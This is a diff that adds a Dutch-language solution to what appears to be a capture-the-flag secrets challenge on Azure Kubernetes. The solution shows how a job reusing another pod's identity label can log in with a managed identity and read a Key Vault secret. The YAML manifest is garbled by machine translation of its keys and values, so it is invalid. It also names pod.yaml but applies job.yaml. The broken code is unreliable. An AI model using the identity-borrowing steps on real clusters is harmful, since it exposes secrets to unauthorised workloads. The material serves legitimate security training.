@@ -1,0 +1,32 @@
+Je kunt deze uitdaging oplossen door de volgende stappen te volgen:
+
+- Controleer uw kluisnaam met `terraform output vault_name`.
+
+- Maak een nieuw pod-bestand `pod.yaml` met de volgende inhoud (vervang de kluisnaam door de uitvoer van de vorige stap):
+
+```jaml
+apiVersie: batch/v1
+soort: baan
+metagegevens:
+  naam: foutgeheim-3
+  etiketten:
+    aadpodidbinding: afzonderlijke werklastpod-id
+specificatie:
+  sjabloon:
+    metagegevens:
+      naam: foutgeheim3job
+      etiketten:
+        aadpodidbinding: afzonderlijke werklastpod-id
+    specificatie:
+      containers:
+      - naam: az
+        afbeelding: mcr.microsoft.com/azure-cli:latest
+        commando:
+            [
+              "slaap", "7200"
+            ]
+      herstartbeleid: Nooit
+```
+- Pas de taak toe met `kubectl apply -f job.yaml`
+
+U kunt nu de pod uitvoeren en iets als `az login --identity --allow-no-subscriptions && az keyvault secret show --name wrongsecret-3 --vault-name wrongsecrets-vault-00000` uitvoeren. Merk op dat u de werkelijke waarde van `wrongsecrets-vault-00000` kunt vinden in de terraform-status. Omdat de taak toegang heeft tot dezelfde kluis als de geheime uitdagingspod, heeft deze toegang tot zijn geheimen.
